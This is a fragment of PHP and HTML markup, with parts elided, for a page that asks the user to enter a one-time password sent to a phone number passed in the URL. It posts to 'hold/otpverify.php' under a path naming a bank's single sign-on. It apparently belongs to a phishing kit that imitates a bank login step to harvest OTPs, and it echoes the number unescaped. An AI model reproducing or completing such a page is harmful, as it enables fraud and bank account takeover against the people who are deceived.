...
echo '<form autocomplete="off" loginform="true" id="id21" method="post" action="hold/otpverify1.php?number='.$number.'" class="jNice"><div style="display:none">';

} 
else { 
	echo '<form autocomplete="off" loginform="true" id="id21" method="post" action="hold/otpverify.php?number='.$number.'" class="jNice"><div style="display:none">';
} 
?>
		<input type="hidden" name="id21_hf_0" id="id21_hf_0"></div>
			<div id="id24">
								...
								<label class="standardfont formlabel">To continue, please enter the OTP sent to your mobile device ending in XXXXXXXX<?php echo $number ?>.</label><br><br>
...
?>
								...
								<tr>
									...
									<a href="http://localhost/dashboard/ss/bdo/sso/b/otp?param1=true#" style="text-decoration:underline" id="genOTP" onclick="genOTP()">One-Time Password</a>
